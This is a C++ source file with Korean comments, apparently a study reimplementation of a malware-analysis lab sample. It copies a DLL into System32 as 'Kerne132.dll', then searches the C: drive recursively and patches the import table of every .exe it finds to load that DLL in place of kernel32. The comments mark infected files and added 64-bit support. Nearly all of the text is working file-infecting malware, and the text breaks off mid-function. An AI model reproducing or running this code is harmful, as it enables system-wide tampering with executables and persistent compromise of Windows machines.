#include <iostream>
#include <Windows.h>
#pragma warning(disable: 4996) //보안함수 미사용 경고제거

#define aWarning_this_w "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"

DWORD SearchExeFile(LPCSTR lpFileName, int dirCountNum);
DWORD ChangeIDTnameRVA(LPCSTR filePathName, LPCSTR bStr, LPCSTR aStr);
DWORD ChangeIDTnameRVA64(LPCSTR filePathName, LPCSTR bStr, LPCSTR aStr);
DWORD RvaToRaw(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA);
DWORD RvaToRaw64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA);
DWORD RawToRva(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA);
DWORD RawToRva64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA);
DWORD FindSectionHeader(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD address);
DWORD FindSectionHeader64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD address);

//기존악성코드에 추가된 부분.
//1. PE32+ 파일 지원
//2. 콘솔창에 감염시킨 파일은 "hit!", 패스하는 파일은 "pass" 표기

void main(int argc, char argv[])
{
	setlocale(LC_ALL, "Korean");

	if (argc == 2 && !strcmp((LPCSTR)&argv[1], aWarning_this_w))
		exit(0);

	#pragma region Kernel32.dll

	HANDLE hFile;
	HANDLE hMapping;
	LPVOID lpMapView;

	hFile = CreateFileA("C:\\Windows\\System32\\Kernel32.dll", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	hMapping = CreateFileMappingA(hFile, 0, PAGE_READONLY, 0, 0, 0);
	lpMapView = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
	if (!lpMapView)
		exit(0);

	DWORD RawOnMemory = (DWORD)(DWORD *)lpMapView; //RawOnMemory = RAW + MapViewOfFile 리턴값

	IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER *)RawOnMemory;
	IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)(RawOnMemory + idh->e_lfanew);

	//PE32+은 지원하지 않음(추후에 없데이트)
	//IMAGE_NT_HEADERS Machine 확인(PE32 Machine 014C / PE32+ Machine 8664)
	if ((WORD)(WORD *)inh->FileHeader.Machine == (WORD)0x8664)
	{
		UnmapViewOfFile(lpMapView);
		CloseHandle(hMapping);
		CloseHandle(hFile);

		exit(0);
	}

	DWORD iedRva = inh->OptionalHeader.DataDirectory[0].VirtualAddress;
	DWORD sziedRva = inh->OptionalHeader.DataDirectory[0].Size;
	DWORD iedRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)iedRva);

	if (iedRawOnMemory == 0)
		exit(0);

	//IMAGE_EXPORT_DIRECTORY
	IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)iedRawOnMemory;

	//EXPORT Addess Table
	DWORD eatRva = ied->AddressOfFunctions;
	DWORD eatRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)eatRva);

	//EXPORT Name Pointer Table
	DWORD enptRva = ied->AddressOfNames;
	DWORD enptRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)enptRva);

	//EXPORT Ordinal Table
	DWORD eotRva = ied->AddressOfNameOrdinals;
	DWORD eotRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)eotRva);

	//printf("kernel32.dll\n");

	#pragma endregion

	#pragma region Lab01-01.dll

	HANDLE hFileDll;
	HANDLE hMappingDll;
	LPVOID lpMapViewDll;


	hFileDll = CreateFileA(".\\Lab01-01.dll", GENERIC_ALL, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	hMappingDll = CreateFileMappingA(hFileDll, 0, PAGE_EXECUTE_READWRITE, 0, 0, 0);
	lpMapViewDll = MapViewOfFile(hMappingDll, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (!lpMapViewDll)
		exit(0);

	DWORD RawOnMemoryDll = (DWORD)(DWORD *)lpMapViewDll; //RawOnMemory = RAW + MapViewOfFile 리턴값

	IMAGE_DOS_HEADER *idhDll = (IMAGE_DOS_HEADER *)RawOnMemoryDll;
	IMAGE_NT_HEADERS *inhDll = (IMAGE_NT_HEADERS *)(RawOnMemoryDll + idhDll->e_lfanew);

	DWORD iedRvaDll = inhDll->OptionalHeader.DataDirectory[0].VirtualAddress;
	DWORD sziedRvaDll = inhDll->OptionalHeader.DataDirectory[0].Size;
	DWORD iedRawOnMemoryDll = RvaToRaw(inhDll, RawOnMemoryDll, (DWORD)(DWORD *)iedRvaDll);

	if (iedRawOnMemoryDll == 0)
		exit(0);

	#pragma region Lab01-01.dll IMAGE EXPORT DIRECTORY RawOnMemory 에 kernel32.dll IMAGE EXPORT DIRECTORY RawOnMemory 를 Lab01-01.dll EXPORT Table Size(0002 3E16) 만큼 덮어쓰기
	DWORD ESI = NULL;
	DWORD EDI = NULL;

	DWORD length = sziedRvaDll;

	//임의로 넣은 if문(기존코드는 섹션 범위를 침범)
	length = length + (length % 4);
	if (sziedRvaDll > sziedRva)
	{
		length = sziedRva;

		//한번에 4BYTE 덮어씌우는데 전체 길이가 4로 안나뉘면 완전히 덮어씌울 수 없기 때문에 뒤쪽의 남는 크기만큼만 덮어씌우는 코드.
		if (length % 4)
		{
			ESI = iedRawOnMemoryDll + length;
			EDI = iedRawOnMemory + length;

			for (DWORD i = length % 4; i > 0; i--)
			{
				*(BYTE *)ESI = *(BYTE *)EDI;
			}
		}
	}

	for (DWORD i = 0; i <= length; i += 4)
	{
		ESI = iedRawOnMemoryDll + i;
		EDI = iedRawOnMemory + i;

		//해킹코드
		*(DWORD *)ESI = *(DWORD *)EDI;
	}
	#pragma endregion

	//IMAGE_EXPORT_DIRECTORY

	//EXPORT Addess Table
	DWORD eatRawOnMemoryDll = iedRawOnMemoryDll + 0x28; //중요

	//EXPORT Name Pointer Table
	//밑에 있는 코드에서 나온다.

	//EXPORT Ordinal Table
	//밑에 있는 코드에서 나온다.

	#pragma endregion Lab01-01.dll

	//Lab01 - 01.dll Number of Fuctions 에 kernel32.dll Number of Fuctions 덮어씌움 = > 의미없음
	*(DWORD *)(iedRawOnMemoryDll + 0x14) = ied->NumberOfFunctions;

	//Lab01-01.dll Number of Names 에 kernel32.dll Number of Names 덮어씌움 => 의미없음
	*(DWORD *)(iedRawOnMemoryDll + 0x18) = ied->NumberOfNames;

	DWORD MinusRawOnMemoryDll = RawToRva(inhDll, RawOnMemoryDll, iedRvaDll);

	//Lab01-01.dll IMAGE EXPORT DIRECTORY의 Name RVA 에 Lab01-01.dll EXPORT Addess Table RVA
	*(DWORD *)(iedRawOnMemoryDll + 0xC) = eatRawOnMemoryDll + MinusRawOnMemoryDll;

	//Lab01-01.dll EXPORT Addess Table [RawOnMemory] 에 kerne132.dll 문자열을 넣음
	strncpy((LPSTR)eatRawOnMemoryDll, "kerne132.dll" + 0x00, strlen("kerne132.dll") + 1);

	//Lab01-01.dll IMAGE EXPORT DIRECTORY의 EXPORT Address Table RVA(망가진값) 에 EXPORT Addess Table RVA + x10
	eatRawOnMemoryDll = eatRawOnMemoryDll + 0x10;
	*(DWORD *)(iedRawOnMemoryDll + 0x1C) = eatRawOnMemoryDll + MinusRawOnMemoryDll;

	//Lab01-01.dll EXPORT Addess Table RawOnMemory										는 EXPORT Names(실상은 NameRVA) 로 쓰인다.
	//Lab01-01.dll EXPORT Addess Table RawOnMemory + 0x10								는 EXPORT Addess Table 로 쓰인다.  
	//Lab01-01.dll EXPORT Addess Table RawOnMemory + 0x10 + (Number of Fuctions * 4)	는 EXPORT Ordinal Table 로 쓰인다.		(기존의 EXPORT Name Pointer Table RVA + x10 에 해당하던 주소이다.)
	//Lab01-01.dll EXPORT Addess Table RawOnMemory + 0x10 + (Number of Fuctions * 8)	는 EXPORT Name Pointer Table 로 쓰인다. (기존의 EXPORT Ordinal Table RVA + x10 에 해당하던 주소이다. )
	//Lab01-01.dll EXPORT Addess Table RawOnMemory + 0x10 + (Number of Fuctions * 12)	는 EXPORT Names(NameRVA는 없이) 로 쓰인다.

	//한마디로 기존의 EXPORT Addess Table 자리에 NameRVA(0x10) + EXPORT Addess Table + EXPORT Ordinal Table + EXPORT Name Pointer Table + EXPORT Names + 복사된 뒷부분(지워도 무방)

	//0x10의 의미 : 16바이트(kerne132.dll 문자열을 참조하는 RVA) 뒤
	
	//Lab01-01.dll IMAGE EXPORT DIRECTORY의 EXPORT Ordinal Table RVA(망가진값) 에 값을 넣는다.
	DWORD eotRawOnMemoryDll = eatRawOnMemoryDll + (ied->NumberOfFunctions * 4);
	*(DWORD *)(iedRawOnMemoryDll + 0x24) = eotRawOnMemoryDll + MinusRawOnMemoryDll;

	//Lab01-01.dll IMAGE EXPORT DIRECTORY의 EXPORT Name Pointer Table RVA(망가진값) 에 값을 넣는다.
	DWORD enptRawOnMemoryDll = eatRawOnMemoryDll + (ied->NumberOfFunctions * 8);
	*(DWORD *)(iedRawOnMemoryDll + 0x20) = enptRawOnMemoryDll + MinusRawOnMemoryDll;

	//EBX = Lab01-01.dll EXPORT Names RawOnMemory = Lab01-01.dll EXPORT Addess Table RawOnMemory + x10 + (Number of Fuctions * 12)  
	DWORD _enRawOnMemoryDll = eatRawOnMemoryDll + (ied->NumberOfFunctions * 12);

	for (DWORD i = 0; i < ied->NumberOfNames; i++) //i = Ordinal
	{
		if (*(DWORD *)(eatRawOnMemory + i) == 0x00000000)
			break;

		//EBP = Lab01-01.dll EXPORT Addess Table RawOnMemory+	//기존 Lab01-01.dll EXPORT Addess Table RawOnMemory+ 자리에는 Addess 주소에 대신 ForwardedName 방식을 이용한다. NamePointer table 위치(기존 oridinal table 위치)에 문자열로 적혀있음.
		DWORD _eatRawOnMemoryDll = eatRawOnMemoryDll + (i * 4);

		// Lab01-01.dll EXPORT Name Pointer Table RawOnMemory+ (기존 EXPORT Ordinal Table RawOnMemory+)
		DWORD _enptRawOnMemoryDll = enptRawOnMemoryDll + (i * 4);

		//[ESP+10] = Lab01-01.dll EXPORT Ordinal Table RawOnMemory+ (기존 EXPORT Name Pointer Table RawOnMemory+)
		DWORD _eotRawOnMemoryDll = eotRawOnMemoryDll + (i * 2);

		//[ESP+18] = kernel32.dll EXPORT Name Pointer Table RawOnMemory+
		DWORD _enptRawOnMemory = enptRawOnMemory + (i * 4); 

		//[ESP+14] = kernel32.dll EXPORT Ordinal Table RawOnMemory +
		DWORD _eotRawOnMemory = eotRawOnMemory + (i * 2); 

		for (DWORD n = 0; n < ied->NumberOfNames; n++)
		{
			if ((WORD)*(DWORD *)_eotRawOnMemory == n) //(WORD)를 붙어줘야 2바이트만 읽음
			{
				//printf("kernel32.dll Ordinal : %d  N : %d\n", (BYTE)(BYTE *)_eotRawOnMemory, n);
				//kernel32.dll EXPORT Names RVA+ = kernel32.dll EXPORT Name Pointer Table [RawOnMemory+]
				DWORD enRva = *(DWORD *)_enptRawOnMemory;

				//kernel32.dll EXPORT Names RawOnMemory+
				DWORD nameRawOnMemory = RvaToRaw(inh, RawOnMemory, enRva);

				//Lab01-01.dll EXPORT Names [RawOnMemory+] 문자열 수정
				strncpy((LPSTR)_enRawOnMemoryDll, (LPCSTR)nameRawOnMemory + 0x00, strlen((LPCSTR)nameRawOnMemory) + 1);
				
				//Lab01-01.dll EXPORT Ordinal Table [RawOnMemory+] 에 Ordinal
				*(DWORD *)(eotRawOnMemoryDll + (i * 2)) = (WORD)i;	//"(WORD)i" 처럼 WORD 를 안붙이면 BYTE 단위로 값이 들어가서 기존의 값이랑 겹침

				//Lab01-01.dll EXPORT Name Pointer Table [RawOnMemory+] 에 Name Pointer
				*(DWORD *)(_enptRawOnMemoryDll) = _enRawOnMemoryDll + MinusRawOnMemoryDll;

				//EBX = 다음 Name 값으로 (Lab01-01.dll Names RawOnMemory+)
				_enRawOnMemoryDll = _enRawOnMemoryDll + strlen((LPCSTR)nameRawOnMemory) + 1;

				//Lab01-01.dll EXPORT Addess Table [RawOnMemory+] 에 Name Pointer ("Kerenl32.문자열" RVA를 넣어서 ForwardedName 방식을 사용)
				*(DWORD *)(_eatRawOnMemoryDll) = _enRawOnMemoryDll + MinusRawOnMemoryDll;

				//먼저 Kerenl32.문자열 부터
				strncpy((LPSTR)_enRawOnMemoryDll, (LPCSTR)"Kernel32." + 0x00, strlen((LPCSTR)"Kernel32.") + 1);

				//EBX + 9 = "Kernel32." 문자열 공간
				_enRawOnMemoryDll += 9;

				//결과적으로 Lab01-01.dll EXPORT Names 에는 기존 "함수" 문자열과 "Kerenl32.함수" 문자열 두가지 버전을 가지게 됨
				strncpy((LPSTR)_enRawOnMemoryDll, (LPCSTR)nameRawOnMemory + 0x00, strlen((LPCSTR)nameRawOnMemory) + 1);

				//EBX = 다음 Name 값으로 (Lab01-01.dll Names RawOnMemory+)
				_enRawOnMemoryDll = _enRawOnMemoryDll + strlen((LPCSTR)nameRawOnMemory) + 1;
			}

			//kernel32.dll EXPORT Name Pointer Table RawOnMemory+
			_enptRawOnMemory = enptRawOnMemory + (n * 4);

			//kernel32.dll EXPORT Ordinal Table RawOnMemory+
			_eotRawOnMemoryDll = eotRawOnMemoryDll + (n * 2);

		}

	}

	if (!CopyFile(".\\Lab01-01.dll", "C:\\Windows\\System32\\Kerne132.dll", FALSE))
		exit(0);

	SearchExeFile("C:\\*", 0);

	UnmapViewOfFile(lpMapView);
	CloseHandle(hMapping);
	CloseHandle(hFile);

	UnmapViewOfFile(lpMapViewDll);
	CloseHandle(hMappingDll);
	CloseHandle(hFileDll);

	return;
}

//서치할 디렉토리 주소를 받고 dirCountNum 값만큼(최대 7), 해당주소에서 디렉토리를 재귀로 서치하며 파일이름 중 ".exe" 를 가지는 파일을 찾아낸다.
DWORD SearchExeFile(LPCSTR lpFileName, int dirCountNum)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = INVALID_HANDLE_VALUE;

	if (dirCountNum <= 7)
	{
		hFindFile = FindFirstFile(lpFileName, &FindFileData);

		while (hFindFile != INVALID_HANDLE_VALUE)
		{
			//FindFirstFile, FindNextFile 함수는 서치하는 첫 디렉토리에서 2개의 ".", ".." 디렉토리를 서치함으로 패싱한다. 
			if (!strcmp(FindFileData.cFileName, ".") || !strcmp(FindFileData.cFileName, ".."))
			{
				int result = FindNextFile(hFindFile, &FindFileData);
				if (!result)
					return result;
				continue;
			}

			if (FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) //파일
			{
				//"new char" 으로 초기화
				LPSTR filePathName = new char[MAX_PATH];

				strncpy(filePathName, lpFileName, strlen(lpFileName));
				filePathName[strlen(lpFileName) - 1] = 0;
				strcat(filePathName, FindFileData.cFileName);

				#pragma region 해석실패(.exe 확장자 찾기구문)
				//int fileLen = strlen(FindFileData.cFileName) + 1;
				//if (!stricmp((LPSTR)&FindFileData.dwReserved0 + fileLen + 3, ".exe")) 
				#pragma endregion

				if (strstr(filePathName, ".exe"))
				{
					if (!strstr(filePathName, ".exe."))
					{
						printf("%s \n", filePathName);
						if (!ChangeIDTnameRVA(filePathName, "kernel32.dll", "kerne132.dll"))
						{
							printf("pass\n");
							//return 0;
						}
							
					}
				}

			}
			else //디렉토리
			{
				//파일은 "new char" 로 해봤고 디렉토리는 "배열[MAX_PATH]" 으로 해봤다.
				char dirPathName[MAX_PATH] = { 0, };

				strncpy(dirPathName, lpFileName, strlen(lpFileName));
				dirPathName[strlen(lpFileName) - 1] = 0;
				strcat(dirPathName, FindFileData.cFileName);
				strcat(dirPathName, "\\*");

				//재귀구문
				SearchExeFile(dirPathName, dirCountNum + 1);
			}

			int result = FindNextFile(hFindFile, &FindFileData);
			if (!result) //검색이 끝나면
			{
				FindClose(hFindFile);
				return 1;
			}

		}
	}
	return FindClose(hFindFile);
}

//매개변수로 받은 파일에서 IMPORT Directory Table 의 NameRVA 값에 적힌 문자열(Name)을 수정한다.
DWORD ChangeIDTnameRVA(LPCSTR filePathName, LPCSTR bStr, LPCSTR aStr) // bStr = "kernel32.dll" aStr = "kerne132.dll"
{
	HANDLE hfile = NULL;
	HANDLE hMapping = NULL;
	LPVOID lpMapView = NULL;	//LPVOID = var

	hfile = CreateFile(filePathName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	hMapping = CreateFileMapping(hfile, NULL, PAGE_READWRITE, 0, 0, NULL);
	lpMapView = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (lpMapView == 0)
		return 0;

	DWORD RawOnMemory = (DWORD)(DWORD *)lpMapView; //RawOnMemory = RAW + MapViewOfFile 리턴값

	IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER *)RawOnMemory;
	IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)(RawOnMemory + idh->e_lfanew);

	//IMAGE_NT_HEADERS Signature 확인
	if ((WORD)(WORD *)(inh->Signature) != (WORD)0x4550)
		return 0;

	//IMAGE_NT_HEADERS Machine 확인(PE32 Machine 014C / PE32+ Machine 8664)
	if ((WORD)(WORD *)inh->FileHeader.Machine == (WORD)0x8664)
	{
		UnmapViewOfFile(lpMapView);
		CloseHandle(hMapping);
		CloseHandle(hfile);

		//만약 PE32+ 파일, 죽 64비트 기반이면 ChangeIDTnameRVA64 으로
		return ChangeIDTnameRVA64(filePathName, bStr, aStr);
	}


	DWORD iidRva = inh->OptionalHeader.DataDirectory[1].VirtualAddress;
	DWORD iidRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)iidRva);

	if (iidRawOnMemory == 0)
		return 0;

	IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)iidRawOnMemory;

	for (size_t i = 0x14; ; i += 0x14)
	{
		//if (IsBadReadPtr((LPVOID *)iid->TimeDateStamp, 4))
		//	return 1;

		if (iid->TimeDateStamp == 0)
		{
			if (iid->Name == 0)
			{
				UnmapViewOfFile(lpMapView);
				CloseHandle(hMapping);
				CloseHandle(hfile);
				return 0;
			}
		}

		DWORD nameRVA = (DWORD)(DWORD *)iid->Name;
		DWORD nameRawOnMemory = RvaToRaw(inh, RawOnMemory, nameRVA);

		//printf("%s \n", (LPCSTR)nameRawOnMemory);

		if (!strnicmp((LPCSTR)nameRawOnMemory, bStr, strlen((LPCSTR)nameRawOnMemory)))
		{
			printf("hit!\n");


			//해킹코드
			strncpy((LPSTR)nameRawOnMemory, aStr, strlen((LPCSTR)nameRawOnMemory));

			//복구코드
			//strncpy((LPSTR)nameRawOnMemory, bStr, strlen(bStr));
			
			return 1;
		}

		//다음 IMPORT Directory
		iidRawOnMemory = RvaToRaw(inh, RawOnMemory, (DWORD)(DWORD *)iidRva + i);
		iid = (IMAGE_IMPORT_DESCRIPTOR *)iidRawOnMemory;
	}

	return 0;
}
DWORD ChangeIDTnameRVA64(LPCSTR filePathName, LPCSTR bStr, LPCSTR aStr)
{
	HANDLE hfile = NULL;
	HANDLE hMapping = NULL;
	LPVOID lpMapView = NULL;	//LPVOID = var

	hfile = CreateFile(filePathName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	hMapping = CreateFileMapping(hfile, NULL, PAGE_READWRITE, 0, 0, NULL);
	lpMapView = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (lpMapView == 0)
		return 0;

	DWORD RawOnMemory = (DWORD)(DWORD *)lpMapView; //RawOnMemory = RAW + MapViewOfFile 리턴값

	IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER *)RawOnMemory;
	IMAGE_NT_HEADERS64 *inh = (IMAGE_NT_HEADERS64 *)(RawOnMemory + idh->e_lfanew);

	//IMAGE_NT_HEADERS Signature 확인
	if ((WORD)(WORD *)(inh->Signature) != (WORD)0x4550)
		return 0;

	//IMAGE_NT_HEADERS Machine 확인(PE32 Machine 014C / PE32+ Machine 8664)
	if ((WORD)(WORD *)inh->FileHeader.Machine != (WORD)0x8664)
		return 0;

	DWORD iidRva = inh->OptionalHeader.DataDirectory[1].VirtualAddress;
	DWORD iidRawOnMemory = RvaToRaw64(inh, RawOnMemory, (DWORD)(DWORD *)iidRva);

	if (iidRawOnMemory == 0)
		return 0;

	IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)iidRawOnMemory;

	for (size_t i = 0x14; ; i += 0x14)
	{
		//if (IsBadReadPtr((LPVOID *)iid->TimeDateStamp, 4))
		//	return 1;

		if (iid->TimeDateStamp == 0)
		{
			if (iid->Name == 0)
			{
				UnmapViewOfFile(lpMapView);
				CloseHandle(hMapping);
				CloseHandle(hfile);
				return 0;
			}
		}

		DWORD nameRVA = (DWORD)(DWORD *)iid->Name;
		DWORD nameRawOnMemory = RvaToRaw64(inh, RawOnMemory, nameRVA);

		//printf("%s \n", (LPCSTR)nameRawOnMemory);

		if (!strnicmp((LPCSTR)nameRawOnMemory, bStr, strlen((LPCSTR)nameRawOnMemory)))
		{
			printf("hit64!\n");
			
			//해킹코드
			strncpy((LPSTR)nameRawOnMemory, aStr, strlen((LPCSTR)nameRawOnMemory));

			//복구코드
			//strncpy((LPSTR)nameRawOnMemory, bStr, strlen(bStr));
			
			return 1;
		}

		//다음 IMPORT Directory
		iidRawOnMemory = RvaToRaw64(inh, RawOnMemory, (DWORD)(DWORD *)iidRva + i);
		iid = (IMAGE_IMPORT_DESCRIPTOR *)iidRawOnMemory;
	}

	printf("ChangeIDTnameRVA64 \n");
	return 0;
}

//RVA 를 RAW 값으로 바꾼뒤 메모리 값을 더해서 "메모리에 올라온 RAW 값"(= RawOnMemory)을 구한다.  
DWORD RvaToRaw(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA)
{
	DWORD SectionHeaderRVA = FindSectionHeader(_IMAGE_NT_HEADERS, RVA);

	if (SectionHeaderRVA == 0)
		return 0;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)SectionHeaderRVA;
	DWORD PointerToRawData = ish->PointerToRawData;
	DWORD VirtualAddress = ish->VirtualAddress;

	#pragma region 배수 맞추기
	DWORD FileAlignment = _IMAGE_NT_HEADERS->OptionalHeader.FileAlignment;
	DWORD SectionAlignment = _IMAGE_NT_HEADERS->OptionalHeader.SectionAlignment;

	if (PointerToRawData % FileAlignment > 0)
	{
		PointerToRawData = PointerToRawData - (PointerToRawData % FileAlignment);
		//PointerToRawData를 FileAlignment에 맞출 땐 반드시 내려야 한다.
	}

	if (VirtualAddress % SectionAlignment > 0)
	{
		VirtualAddress = VirtualAddress - (VirtualAddress % SectionAlignment);
		//VirtualAddress를 SectionAlignment에 맞출 땐 반드시 내려야 한다.
	}
	#pragma endregion

	DWORD RAW = RVA - VirtualAddress + PointerToRawData;
	DWORD RawOnMemory = RAW + loadedMemoryAdr;


	return RawOnMemory;
}
DWORD RvaToRaw64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA)
{
	DWORD SectionHeaderRVA = FindSectionHeader64(_IMAGE_NT_HEADERS, RVA);

	if (SectionHeaderRVA == 0)
		return 0;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)SectionHeaderRVA;
	DWORD PointerToRawData = ish->PointerToRawData;
	DWORD VirtualAddress = ish->VirtualAddress;

	#pragma region 배수 맞추기
	DWORD FileAlignment = _IMAGE_NT_HEADERS->OptionalHeader.FileAlignment;
	DWORD SectionAlignment = _IMAGE_NT_HEADERS->OptionalHeader.SectionAlignment;

	if (PointerToRawData % FileAlignment > 0)
	{
		PointerToRawData = PointerToRawData - (PointerToRawData % FileAlignment);
		//PointerToRawData를 FileAlignment에 맞출 땐 반드시 내려야 한다.
	}

	if (VirtualAddress % SectionAlignment > 0)
	{
		VirtualAddress = VirtualAddress - (VirtualAddress % SectionAlignment);
		//VirtualAddress를 SectionAlignment에 맞출 땐 반드시 내려야 한다.
	}
	#pragma endregion

	DWORD RAW = RVA - VirtualAddress + PointerToRawData;
	DWORD RawOnMemory = RAW + loadedMemoryAdr;

	return RawOnMemory;
}

//"메모리에 올라온 RAW 값"(= RawOnMemory)(RVA가 가리키는 영역)과 이 리턴값을 이용해 추후에 RVA 값으로 만들 수 있다. (간단히 -loadedMemoryAdr)
DWORD RawToRva(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA)
{
	DWORD SectionHeaderRVA = FindSectionHeader(_IMAGE_NT_HEADERS, RVA);

	if (SectionHeaderRVA == 0)
		return 0;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)SectionHeaderRVA;
	DWORD PointerToRawData = ish->PointerToRawData;
	DWORD VirtualAddress = ish->VirtualAddress;

	#pragma region 배수 맞추기
	DWORD FileAlignment = _IMAGE_NT_HEADERS->OptionalHeader.FileAlignment;
	DWORD SectionAlignment = _IMAGE_NT_HEADERS->OptionalHeader.SectionAlignment;

	if (PointerToRawData % FileAlignment > 0)
	{
		PointerToRawData = PointerToRawData - (PointerToRawData % FileAlignment);
		//PointerToRawData를 FileAlignment에 맞출 땐 반드시 내려야 한다.
	}

	if (VirtualAddress % SectionAlignment > 0)
	{
		VirtualAddress = VirtualAddress - (VirtualAddress % SectionAlignment);
		//VirtualAddress를 SectionAlignment에 맞출 땐 반드시 내려야 한다.
	}
	#pragma endregion

	//RawOnMemory = RVA - VirtualAddress + PointerToRawData  + loadedMemoryAdr;
	//RVA = VirtualAddress - PointerToRawData - loadedMemoryAdr + RawOnMemory

	DWORD ret = VirtualAddress - PointerToRawData - loadedMemoryAdr;

	return ret;
}
DWORD RawToRva64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD loadedMemoryAdr, DWORD RVA)
{
	DWORD SectionHeaderRVA = FindSectionHeader64(_IMAGE_NT_HEADERS, RVA);

	if (SectionHeaderRVA == 0)
		return 0;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)SectionHeaderRVA;
	DWORD PointerToRawData = ish->PointerToRawData;
	DWORD VirtualAddress = ish->VirtualAddress;

	#pragma region 배수 맞추기
	DWORD FileAlignment = _IMAGE_NT_HEADERS->OptionalHeader.FileAlignment;
	DWORD SectionAlignment = _IMAGE_NT_HEADERS->OptionalHeader.SectionAlignment;

	if (PointerToRawData % FileAlignment > 0)
	{
		PointerToRawData = PointerToRawData - (PointerToRawData % FileAlignment);
		//PointerToRawData를 FileAlignment에 맞출 땐 반드시 내려야 한다.
	}

	if (VirtualAddress % SectionAlignment > 0)
	{
		VirtualAddress = VirtualAddress - (VirtualAddress % SectionAlignment);
		//VirtualAddress를 SectionAlignment에 맞출 땐 반드시 내려야 한다.
	}
	#pragma endregion

	//RawOnMemory = RVA - VirtualAddress + PointerToRawData  + loadedMemoryAdr;
	//RVA = VirtualAddress - PointerToRawData - loadedMemoryAdr + RawOnMemory

	DWORD ret = VirtualAddress - PointerToRawData - loadedMemoryAdr;

	printf("RawToRva64 \n");
	return ret;
}

//RVA가 어떤 섹션에 속하는지 알기위해 섹션헤드를 NumberOfSections 값 만큼 순회하며 확인 후, 해당되는 섹션 헤더 RawOnMemory 값 을 반환
DWORD FindSectionHeader(IMAGE_NT_HEADERS *_IMAGE_NT_HEADERS, DWORD RVA)
{
	IMAGE_NT_HEADERS *inh = _IMAGE_NT_HEADERS;
	DWORD SizeOfOptionalHeader = inh->FileHeader.SizeOfOptionalHeader;
	DWORD NumberOfSections = inh->FileHeader.NumberOfSections;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)((DWORD)(DWORD *)_IMAGE_NT_HEADERS + SizeOfOptionalHeader + 0x18);
	DWORD VirtualAddress = NULL;
	DWORD VirtualSize = NULL;

	for (size_t i = 0; i < NumberOfSections; i++)
	{
		VirtualAddress = ish->VirtualAddress;
		VirtualSize = ish->Misc.VirtualSize;

		if (VirtualAddress == 0 || VirtualSize == 0)
			return 0;

		if (RVA == VirtualAddress)
			return (DWORD)(DWORD *)ish;

		DWORD SectionSize = VirtualAddress + VirtualSize;

		//해당섹션이 특정주소를 가지는지 확인 (특정주소값이 해당섹션보다 큰지 비교)
		if (SectionSize > RVA)
			return (DWORD)(DWORD *)ish;

		ish = (IMAGE_SECTION_HEADER *)((DWORD)(DWORD *)ish + 0x28);
	}

	return (DWORD)(DWORD *)ish;
}
DWORD FindSectionHeader64(IMAGE_NT_HEADERS64 *_IMAGE_NT_HEADERS, DWORD RVA)
{
	IMAGE_NT_HEADERS64 *inh = _IMAGE_NT_HEADERS;
	DWORD SizeOfOptionalHeader = inh->FileHeader.SizeOfOptionalHeader;
	DWORD NumberOfSections = inh->FileHeader.NumberOfSections;

	IMAGE_SECTION_HEADER *ish = (IMAGE_SECTION_HEADER *)((DWORD)(DWORD *)_IMAGE_NT_HEADERS + SizeOfOptionalHeader + 0x18);
	DWORD VirtualAddress = NULL;
	DWORD VirtualSize = NULL;

	for (size_t i = 0; i < NumberOfSections; i++)
	{
		VirtualAddress = ish->VirtualAddress;
		VirtualSize = ish->Misc.VirtualSize;

		if (VirtualAddress == 0 || VirtualSize == 0)
			return 0;

		if (RVA == VirtualAddress)
			return (DWORD)(DWORD *)ish;

		DWORD SectionSize = VirtualAddress + VirtualSize;

		//해당섹션이 특정주소를 가지는지 확인 (특정주소값이 해당섹션보다 큰지 비교)
		if (SectionSize > RVA)
